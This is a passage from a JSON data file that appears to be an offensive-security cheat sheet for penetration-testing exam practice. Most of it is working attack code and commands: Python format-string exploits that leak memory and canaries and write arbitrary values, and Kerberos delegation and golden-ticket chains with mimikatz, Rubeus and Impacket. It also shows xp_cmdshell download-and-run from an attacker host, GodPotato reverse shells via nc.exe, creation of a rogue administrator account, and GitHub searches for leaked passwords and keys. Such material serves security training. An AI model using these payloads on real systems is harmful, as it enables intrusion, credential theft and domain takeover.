            "code": "import struct\n\ndef leak_memory(sock, addr, position):\n    \"\"\"Leak DWORD at arbitrary address using %s\"\"\"\n    # Place address at known position, use %s to read string there\n    payload = struct.pack(\"<I\", addr)\n    payload += f\"%{position}$s\".encode()\n    sock.send(payload + b\"\\n\")\n    response = sock.recv(1024)\n    # Address bytes followed by string at that address\n    return response[4:]  # Skip the address we sent"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Read memory at arbitrary address."
          }
        ]
      },
      {
        "title": "Leak Multiple DWORDs",
        "codes": [
          {
            "lang": "python",
            "code": "def leak_range(sock, start_addr, count, position):\n    \"\"\"Leak multiple DWORDs\"\"\"\n    leaked = b\"\"\n    for i in range(count):\n        addr = start_addr + (i * 4)\n        data = leak_dword(sock, addr, position)\n        leaked += data\n        print(f\"0x{addr:08x}: {data.hex()}\")\n    return leaked"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Read range of memory."
          }
        ]
      },
      {
        "title": "Leak Return Address for ASLR Bypass",
        "codes": [
          {
            "lang": "python",
            "code": "# Stack typically contains return addresses\n# Leak values and identify module addresses\n\ndef find_return_addr(host, port):\n    \"\"\"Leak stack to find return address\"\"\"\n    s = socket.socket()\n    s.connect((host, port))\n\n    # Leak many stack values\n    payload = b\".%08x\" * 50 + b\"\\n\"\n    s.send(payload)\n    response = s.recv(4096).decode()\n    s.close()\n\n    # Parse leaked values\n    values = response.split(\".\")\n    for i, val in enumerate(values):\n        if val.startswith(\"0x\") or len(val) == 8:\n            try:\n                addr = int(val, 16)\n                # Check if looks like code address\n                if 0x10000000 <= addr <= 0x7FFFFFFF:\n                    print(f\"Position {i}: 0x{addr:08x}\")\n            except:\n                pass"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find saved return address to calculate base."
          }
        ]
      },
      {
        "title": "Leak GOT Entry",
        "codes": [
          {
            "lang": "python",
            "code": "# GOT contains resolved function addresses\n# Leak to calculate libc base\n\nGOT_PRINTF = 0x08049000  # Example GOT entry\n\npayload = struct.pack(\"<I\", GOT_PRINTF)\npayload += f\"%{position}$s\".encode()\n\n# Response contains printf's real address\n# Calculate libc base: printf_real - printf_offset"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Read GOT to find libc base."
          }
        ]
      },
      {
        "title": "Leak Stack Canary",
        "codes": [
          {
            "lang": "python",
            "code": "# Stack canary usually near saved EBP\n# Leak stack values to find it\n\n# Canary characteristics:\n# - Ends with NULL byte (0x00)\n# - Random on each run\n# - Same throughout process\n\ndef find_canary(host, port):\n    \"\"\"Identify potential stack canary\"\"\"\n    s = socket.socket()\n    s.connect((host, port))\n\n    payload = b\".%08x\" * 100 + b\"\\n\"\n    s.send(payload)\n    response = s.recv(4096)\n    s.close()\n\n    values = response.split(b\".\")\n    for i, val in enumerate(values):\n        try:\n            v = int(val, 16)\n            # Canary often ends in 00\n            if v & 0xFF == 0x00 and v != 0:\n                print(f\"Potential canary at {i}: 0x{v:08x}\")\n        except:\n            pass"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Read canary for later bypass."
          }
        ]
      },
      {
        "title": "Parse Leaked Data",
        "codes": [
          {
            "lang": "python",
            "code": "def parse_leak(response, markers):\n    \"\"\"Extract known structures from leaked data\"\"\"\n    results = {}\n\n    # Find marker positions\n    for name, pattern in markers.items():\n        idx = response.find(pattern)\n        if idx != -1:\n            results[name] = idx\n\n    return results\n\n# Example: Finding vtable pointer\nmarkers = {\n    'vtable': b'\\x00\\x10\\x40',  # Common vtable prefix\n    'canary': b'\\x00',           # Canary ends in NULL\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Extract useful information from leaks."
          }
        ]
      },
      {
        "title": "Automated Stack Dump",
        "codes": [
          {
            "lang": "python",
            "code": "def dump_stack(host, port, count=100):\n    \"\"\"Dump stack contents via format string\"\"\"\n    s = socket.socket()\n    s.connect((host, port))\n\n    payload = b\"STACK:\" + b\"|%08x\" * count + b\"\\n\"\n    s.send(payload)\n    response = s.recv(8192).decode()\n    s.close()\n\n    # Parse\n    start = response.find(\"STACK:\") + 6\n    values = response[start:].split(\"|\")\n\n    print(\"Stack dump:\")\n    for i, val in enumerate(values):\n        if val and len(val) >= 8:\n            print(f\"  [{i:3d}] 0x{val[:8]}\")"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Comprehensive stack leak."
          }
        ]
      },
      {
        "title": "Handle Non-Printable Leaks",
        "codes": [
          {
            "lang": "python",
            "code": "# %s stops at NULL bytes\n# For binary data, use %x word by word\n\ndef leak_binary(sock, addr, size, position):\n    \"\"\"Leak binary data containing NULLs\"\"\"\n    data = b\"\"\n    for i in range(0, size, 4):\n        # Read DWORD at addr+i\n        payload = struct.pack(\"<I\", addr + i)\n        payload += f\"%{position}$08x\".encode()\n        # Parse hex response back to bytes\n        # ...\n    return data"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Read binary data safely."
          }
        ]
      },
      {
        "title": "Leak Format String Position Finder",
        "codes": [
          {
            "lang": "python",
            "code": "#!/usr/bin/env python3\nimport socket\nimport struct\n\ndef map_stack(host, port, max_pos=100):\n    \"\"\"Map stack via format string, find input position\"\"\"\n\n    print(f\"Mapping stack for {host}:{port}\")\n\n    for pos in range(1, max_pos):\n        try:\n            s = socket.socket()\n            s.settimeout(5)\n            s.connect((host, port))\n\n            # Send marker + positional read\n            payload = f\"AAAA%{pos}$08x\\n\".encode()\n            s.send(payload)\n            resp = s.recv(1024).decode(errors='ignore')\n            s.close()\n\n            # Check for our marker\n            if \"41414141\" in resp:\n                print(f\"[*] Input found at position {pos}\")\n                return pos\n            else:\n                # Print what we found\n                # Extract the hex value after AAAA\n                if \"AAAA\" in resp:\n                    val = resp.split(\"AAAA\")[1][:8]\n                    print(f\"Position {pos}: {val}\")\n\n        except Exception as e:\n            print(f\"Position {pos}: Error - {e}\")\n\n    return None"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Tool to map stack layout."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Format String Attacks",
        "url": "https://cs155.stanford.edu/papers/formatstring-1.2.pdf"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Use format strings to leak stack contents and memory for **ASLR** bypass."
      }
    ]
  },
  {
    "category": "Format String Theory",
    "title": "Format String Theory",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "Format_String",
      "Windows"
    ],
    "steps": [
      {
        "title": "Vulnerability Pattern [Knowledge]",
        "codes": [
          {
            "lang": "c",
            "code": "// VULNERABLE - user controls format string\nprintf(user_input);\n\n// SAFE - format string is constant\nprintf(\"%s\", user_input);"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "How format string bugs occur:",
            "variant": "danger"
          }
        ]
      },
      {
        "title": "printf Format Specifiers [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "%x   - Print DWORD from stack (hex)\n%s   - Print string at address from stack\n%n   - Write number of chars printed to address from stack\n%p   - Print pointer (similar to %x but with 0x prefix)\n\nModifiers:\n%08x - Print DWORD with 0-padding (8 chars)\n%hn  - Write short (2 bytes) instead of DWORD\n%hhn - Write single byte"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Key format specifiers for exploitation."
          }
        ]
      },
      {
        "title": "Direct Parameter Access [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "%n$x  - Print nth parameter as hex\n%n$s  - Print string at nth parameter address\n%n$n  - Write to address at nth parameter\n\nExamples:\n%7$x  - Print 7th DWORD on stack\n%15$n - Write to address at 15th position"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Access specific stack positions."
          }
        ]
      },
      {
        "title": "Stack Layout During printf [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "When printf(\"AAAA%x%x%x%x\") executes:\n\nStack:\n+------------------+\n| return address   |\n+------------------+\n| format string ptr| <-- printf reads format from here\n+------------------+\n| arg1 (if any)    | <-- %x reads from here (1st)\n+------------------+\n| arg2             | <-- %x reads from here (2nd)\n+------------------+\n| ...              |\n+------------------+\n| buffer content   | <-- Eventually reaches our input\n+------------------+"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "How printf reads from stack."
          }
        ]
      },
      {
        "title": "Identifying Format String Bugs",
        "codes": [
          {
            "lang": "bash",
            "code": "# Send format specifiers\necho -e \"AAAA%08x.%08x.%08x.%08x\" | nc <Target> <Port>\n\n# If output shows hex values, vulnerable\n# Look for 41414141 (AAAA) to find input position"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Test for vulnerability."
          }
        ]
      },
      {
        "title": "Find Input Position on Stack",
        "codes": [
          {
            "lang": "python",
            "code": "# Method 1: Count %x until AAAA appears\npayload = b\"AAAA\" + b\".%08x\" * 20\n\n# Method 2: Direct parameter access\nfor i in range(1, 30):\n    payload = f\"AAAA%{i}$08x\"\n    # Send and check if output is 41414141"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Determine which parameter contains our input."
          }
        ]
      },
      {
        "title": "Why %n is Dangerous [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "%n writes the number of characters printed so far\nto the address stored at that stack position.\n\nIf we control:\n1. An address on the stack\n2. The number of characters printed\n\nWe can write arbitrary values to arbitrary addresses."
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "The write primitive."
          }
        ]
      },
      {
        "title": "printf Internal Operation [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "1. printf receives format string pointer\n2. Walks through format string character by character\n3. For each %specifier:\n   - Reads next argument from stack\n   - Formats and outputs value\n4. For %n:\n   - Reads address from stack\n   - Writes count to that address"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "How printf processes format string."
          }
        ]
      },
      {
        "title": "Common Targets for Writes [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "What to overwrite with format strings:\n- **Return address**: Redirect execution on function return\n- **GOT entry**: Hijack library function call\n- **Function pointer**: Redirect indirect call\n- **SEH handler**: Trigger on exception\n- **Saved EBP**: Stack pivot on function return",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Format String vs Buffer Overflow [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "Buffer Overflow:\n- Requires adjacent overflow\n- Overwrites contiguous memory\n- Often easier to detect\n\nFormat String:\n- Write anywhere in memory\n- Non-contiguous writes possible\n- Can read AND write\n- More precise control"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Comparing exploitation techniques."
          }
        ]
      },
      {
        "title": "Modern Mitigations [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Protections against format strings:\n- **FORTIFY_SOURCE**: Detects format strings without arguments\n- **Stack canaries**: May not help (non-linear writes)\n- **ASLR**: Need info leak first\n- **RELRO**: Full RELRO prevents GOT overwrites",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Format String Exploitation",
        "url": "https://owasp.org/www-community/attacks/Format_string_attack"
      }
    ],
    "foundational": true,
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Format string vulnerabilities allow reading and writing arbitrary memory via printf-family functions."
      }
    ]
  },
  {
    "category": "Format String Write",
    "title": "Format String Write Primitives",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "Format_String",
      "Windows"
    ],
    "steps": [
      {
        "title": "Basic %n Write [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "%n writes the count of characters printed so far\nto the address on the stack.\n\nprintf(\"AAAA%n\", &count);\n// count = 4 (length of \"AAAA\")"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "How %n enables memory writes."
          }
        ]
      },
      {
        "title": "Control Write Value",
        "codes": [
          {
            "lang": "python",
            "code": "# To write value 0x100 (256):\npayload = b\"A\" * 256 + b\"%n\"\n\n# Using width specifier (more efficient):\npayload = b\"%256x%n\"  # Prints 256 chars then writes 256"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Adjust character count to write specific values."
          }
        ]
      },
      {
        "title": "Write to Specific Address",
        "codes": [
          {
            "lang": "python",
            "code": "import struct\n\ntarget_addr = 0x08049000\nposition = 7  # Stack position of our input\n\n# Place address, then write to it\npayload = struct.pack(\"<I\", target_addr)\npayload += f\"%{position}$n\".encode()\n# Writes 4 (length of address) to target_addr"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Place target address on stack, use positional %n."
          }
        ]
      },
      {
        "title": "Write Arbitrary DWORD",
        "codes": [
          {
            "lang": "python",
            "code": "def write_dword(target_addr, value, position):\n    \"\"\"Write 4-byte value using %n\"\"\"\n    # Value must account for address bytes we've already printed\n    addr_len = 4\n\n    # Adjust value for already-printed bytes\n    chars_needed = value - addr_len\n    if chars_needed < 0:\n        chars_needed += 0x100000000  # Handle negative\n\n    payload = struct.pack(\"<I\", target_addr)\n    payload += f\"%{chars_needed}x%{position}$n\".encode()\n    return payload"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Write specific 4-byte value."
          }
        ]
      },
      {
        "title": "Write Using %hn (Half-Word)",
        "codes": [
          {
            "lang": "python",
            "code": "def write_word(target_addr, value, position):\n    \"\"\"Write 2-byte value using %hn\"\"\"\n    payload = struct.pack(\"<I\", target_addr)\n    # Calculate padding to reach desired value\n    current = 4  # Already printed 4 bytes (address)\n    needed = value - current\n    if needed < 0:\n        needed += 0x10000\n\n    payload += f\"%{needed}x%{position}$hn\".encode()\n    return payload"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Write 2 bytes at a time for more control."
          }
        ]
      },
      {
        "title": "Write DWORD Using Two %hn Writes",
        "codes": [
          {
            "lang": "python",
            "code": "def write_dword_hn(target_addr, value, position):\n    \"\"\"Write DWORD using two %hn writes\"\"\"\n    low_word = value & 0xFFFF\n    high_word = (value >> 16) & 0xFFFF\n\n    # Two addresses: target and target+2\n    payload = struct.pack(\"<I\", target_addr)      # Position N\n    payload += struct.pack(\"<I\", target_addr + 2) # Position N+1\n\n    # Calculate writes (accounting for 8 bytes already printed)\n    writes = sorted([\n        (low_word, position),\n        (high_word, position + 1)\n    ], key=lambda x: x[0])\n\n    current = 8\n    for val, pos in writes:\n        needed = val - current\n        if needed < 0:\n            needed += 0x10000\n        if needed > 0:\n            payload += f\"%{needed}x\".encode()\n        payload += f\"%{pos}$hn\".encode()\n        current = val\n\n    return payload"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Split DWORD into two half-word writes."
          }
        ]
      },
      {
        "title": "Write Using %hhn (Single Byte)",
        "codes": [
          {
            "lang": "python",
            "code": "def write_dword_hhn(target_addr, value, position):\n    \"\"\"Write DWORD using four %hhn writes\"\"\"\n    # Extract individual bytes\n    bytes_to_write = [\n        (target_addr + 0, value & 0xFF),\n        (target_addr + 1, (value >> 8) & 0xFF),\n        (target_addr + 2, (value >> 16) & 0xFF),\n        (target_addr + 3, (value >> 24) & 0xFF),\n    ]\n\n    # Place all 4 addresses first\n    payload = b\"\"\n    for addr, _ in bytes_to_write:\n        payload += struct.pack(\"<I\", addr)\n\n    # Sort by value to minimize padding\n    sorted_writes = sorted(enumerate(bytes_to_write),\n                          key=lambda x: x[1][1])\n\n    current = 16  # 4 addresses * 4 bytes\n    for orig_pos, (addr, val) in sorted_writes:\n        needed = val - (current % 256)\n        if needed <= 0:\n            needed += 256\n        payload += f\"%{needed}x%{position + orig_pos}$hhn\".encode()\n        current += needed\n\n    return payload"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Most precise: write 1 byte at a time."
          }
        ]
      },
      {
        "title": "Optimized Write Payload",
        "codes": [
          {
            "lang": "python",
            "code": "def optimized_write(target_addr, value, position):\n    \"\"\"Generate optimized format string write\"\"\"\n\n    # Use %hhn for smallest payloads\n    bytes_list = []\n    for i in range(4):\n        bytes_list.append((\n            target_addr + i,\n            (value >> (i * 8)) & 0xFF\n        ))\n\n    # Sort by byte value\n    sorted_bytes = sorted(enumerate(bytes_list),\n                         key=lambda x: x[1][1])\n\n    # Build payload\n    addresses = b\"\".join(struct.pack(\"<I\", b[0]) for _, b in sorted_bytes)\n\n    format_str = b\"\"\n    printed = len(addresses)\n\n    for idx, (orig_idx, (addr, byte_val)) in enumerate(sorted_bytes):\n        # Calculate chars needed\n        target = byte_val\n        needed = (target - printed) % 256\n\n        if needed > 0:\n            format_str += f\"%{needed}c\".encode()\n            printed += needed\n\n        format_str += f\"%{position + idx}$hhn\".encode()\n\n    return addresses + format_str"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Minimize payload size."
          }
        ]
      },
      {
        "title": "Write Multiple Values",
        "codes": [
          {
            "lang": "python",
            "code": "def multi_write(writes, position):\n    \"\"\"\n    writes: list of (address, value) tuples\n    Each write is a DWORD using %hhn\n    \"\"\"\n    all_bytes = []\n    addr_offset = 0\n\n    for addr, value in writes:\n        for i in range(4):\n            all_bytes.append((\n                addr + i,\n                (value >> (i * 8)) & 0xFF,\n                addr_offset + i\n            ))\n        addr_offset += 4\n\n    # Build addresses section\n    addresses = b\"\".join(struct.pack(\"<I\", b[0]) for b in all_bytes)\n\n    # Sort by value\n    sorted_bytes = sorted(all_bytes, key=lambda x: x[1])\n\n    # Build format string\n    format_str = b\"\"\n    printed = len(addresses)\n\n    for addr, byte_val, orig_pos in sorted_bytes:\n        needed = (byte_val - printed) % 256\n        if needed > 0:\n            format_str += f\"%{needed}c\".encode()\n            printed += needed\n        format_str += f\"%{position + orig_pos}$hhn\".encode()\n\n    return addresses + format_str"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Overwrite multiple addresses in one payload."
          }
        ]
      },
      {
        "title": "Debug Format String Writes",
        "codes": [
          {
            "lang": "text",
            "code": "; Set watchpoint on target address\n0:000> ba w4 <TargetAddress>\n\n; Run and examine when hit\n0:000> g\n0:000> dd <TargetAddress> L1\n\n; Check what value was written"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Verify writes in debugger."
          }
        ]
      },
      {
        "title": "Common Mistakes [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Troubleshooting format string writes:\n- **Wrong position**: Input offset incorrect, writes to wrong address\n- **Byte order**: x86 is little-endian, bytes may seem reversed\n- **NULL in address**: %s terminates, %n may fail\n- **Overflow count**: Large padding values may cause issues",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Exploiting Format String Vulnerabilities",
        "url": "https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Use %n format specifier to write arbitrary values to arbitrary addresses."
      }
    ]
  },
  {
    "category": "Unconstrained Delegation",
    "title": "Full Attack Chain",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "text",
        "content": "```text\n1. Compromise server with unconstrained delegation\n2. Monitor for TGTs: Rubeus.exe monitor /interval:5\n3. Coerce DC: SpoolSample.exe <DC> <CompromisedServer>\n4. Capture DC machine account TGT\n5. Import TGT: Rubeus.exe ptt /ticket:<Ticket>\n6. DCSync: mimikatz lsadump::dcsync /all\n```"
      }
    ]
  },
  {
    "category": "Resource-Based Constrained Delegation",
    "title": "Full Attack Chain (Impacket)",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\n# Create computer account\nimpacket-addcomputer -computer-name ATTACK$ -computer-pass 'P@ssw0rd!' -dc-ip <DC-IP> <Domain>/<User>:<Password>"
      },
      {
        "type": "text",
        "content": "# Configure RBCD\nimpacket-rbcd -delegate-to <Target>$ -delegate-from ATTACK$ -dc-ip <DC-IP> -action write <Domain>/<User>:<Password>"
      },
      {
        "type": "text",
        "content": "# Get service ticket\nimpacket-getST -spn cifs/<Target>.<Domain> -impersonate Administrator -dc-ip <DC-IP> <Domain>/ATTACK$:'P@ssw0rd!'"
      },
      {
        "type": "text",
        "content": "# Use ticket\nexport KRB5CCNAME=Administrator.ccache\nimpacket-secretsdump -k -no-pass <Target>.<Domain>\n```"
      }
    ]
  },
  {
    "category": "Constrained Delegation",
    "title": "Full Attack Example",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "text",
        "content": "```text\n1. Find constrained delegation: Get-DomainComputer -TrustedToAuth\n2. Dump service account hash: mimikatz sekurlsa::logonpasswords\n3. S4U attack: Rubeus.exe s4u /user:websvc /rc4:<Hash> /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.local /ptt\n4. Access target: dir \\\\dc01.domain.local\\c$\n```"
      }
    ]
  },
  {
    "category": "MS SQL Privilege Escalation",
    "title": "Getting Code Execution",
    "tags": [
      "Exploitation",
      "Privilege_Escalation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "Enable xp_cmdshell",
        "codes": [
          {
            "lang": "sql",
            "code": "-- Enable advanced options\nEXEC sp_configure 'show advanced options', 1\nRECONFIGURE\n\n-- Enable xp_cmdshell\nEXEC sp_configure 'xp_cmdshell', 1\nRECONFIGURE"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Execute Commands",
        "codes": [
          {
            "lang": "sql",
            "code": "EXEC xp_cmdshell 'whoami'\nEXEC xp_cmdshell 'hostname'\nEXEC xp_cmdshell 'ipconfig'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Reverse Shell via xp_cmdshell",
        "codes": [
          {
            "lang": "sql",
            "code": "EXEC xp_cmdshell 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''http://<AttackerIP>/shell.ps1'')\"'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Via Impacket",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-mssqlclient sa:<Password>@<Target>\nSQL> enable_xp_cmdshell\nSQL> xp_cmdshell whoami"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "GitHub Dorking (External Recon)",
    "tags": [],
    "steps": [
      {
        "title": "Search Operators",
        "codes": [
          {
            "lang": "plaintext",
            "code": "# Organization repositories\norg:<organization-name>\n\n# Specific filename\nfilename:config.php\n\n# File extension\nextension:env\n\n# Code content\n\"password\" extension:php\n\n# Specific user\nuser:<username>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example Searches",
        "codes": [
          {
            "lang": "plaintext",
            "code": "# Find .env files\norg:company-name filename:.env\n\n# Find database configs\norg:company-name filename:database.yml\n\n# Find API keys\norg:company-name \"api_key\"\n\n# Find passwords in code\norg:company-name \"password\" extension:php"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Using GitHub CLI",
        "codes": [
          {
            "lang": "bash",
            "code": "# Install gh\nsudo apt install gh\n\n# Search code\ngh search code \"password\" --repo company/repo"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "This section is for external GitHub reconnaissance, not typically relevant for OSCP exam.",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "GodPotato",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Check Compatibility",
        "codes": [
          {
            "lang": "powershell",
            "code": "(Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\").CurrentBuild -ge 9200"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Download",
        "codes": [
          {
            "lang": "powershell",
            "code": "(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/GodPotato-NET4.exe','GodPotato.exe')"
          },
          {
            "lang": "powershell",
            "code": "iwr -uri http://<KaliIP>/GodPotato-NET4.exe -Outfile GodPotato.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Basic Usage",
        "codes": [
          {
            "lang": "bash",
            "code": "GodPotato.exe -cmd \"whoami\""
          },
          {
            "lang": "bash",
            "code": "GodPotato.exe -cmd \"cmd /c whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Reverse Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "GodPotato.exe -cmd \"C:\\Windows\\Temp\\nc.exe <AttackerIP> <Port> -e cmd.exe\""
          },
          {
            "lang": "bash",
            "code": "GodPotato.exe -cmd \"cmd /c C:\\Windows\\Temp\\nc.exe <AttackerIP> <Port> -e cmd.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Add User to Administrators",
        "codes": [
          {
            "lang": "bash",
            "code": "GodPotato.exe -cmd \"net user hacker Password123! /add\"\nGodPotato.exe -cmd \"net localgroup administrators hacker /add\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execute PowerShell",
        "codes": [
          {
            "lang": "bash",
            "code": "GodPotato.exe -cmd \"powershell -e <Base64EncodedCommand>\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "GodPotato GitHub",
        "url": "https://github.com/BeichenDream/GodPotato"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Newest and most reliable potato. Works on Windows 8-11 and Server 2012-2022. **Try this first!**",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Golden Ticket",
    "title": "Golden Ticket",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Prerequisites",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Get domain SID\n(Get-ADDomain).DomainSID.Value"
          },
          {
            "lang": "powershell",
            "code": "# Get krbtgt hash via DCSync\n.\\mimikatz.exe \"lsadump::dcsync /domain:<Domain> /user:krbtgt\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Need **krbtgt** hash and domain SID.",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Create Golden Ticket with Mimikatz",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ptt\" \"exit\""
          },
          {
            "lang": "powershell",
            "code": "# Save to file instead of injecting\n.\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ticket:golden.kirbi\" \"exit\""
          },
          {
            "lang": "powershell",
            "code": "# Specify user ID (500 = default Administrator)\n.\\mimikatz.exe \"kerberos::golden /user:FakeAdmin /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /id:500 /ptt\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Create Golden Ticket with Rubeus",
        "codes": [
          {
